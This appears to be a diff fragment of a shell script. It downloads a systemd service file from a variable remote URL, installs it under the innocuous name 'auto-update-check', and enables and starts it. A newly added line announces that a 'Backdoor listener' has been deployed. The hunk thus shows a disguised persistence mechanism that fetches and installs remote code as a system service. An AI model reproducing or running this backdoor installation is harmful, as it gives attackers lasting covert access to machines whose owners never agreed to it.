@@ -14,3 +14,5 @@ curl -s "$BASE_URL/auto-update-check.service" > /etc/systemd/system/auto-update-
 systemctl daemon-reload
 systemctl enable auto-update-check
 systemctl start auto-update-check
+
+echo "[+] Backdoor listener deployed and running"
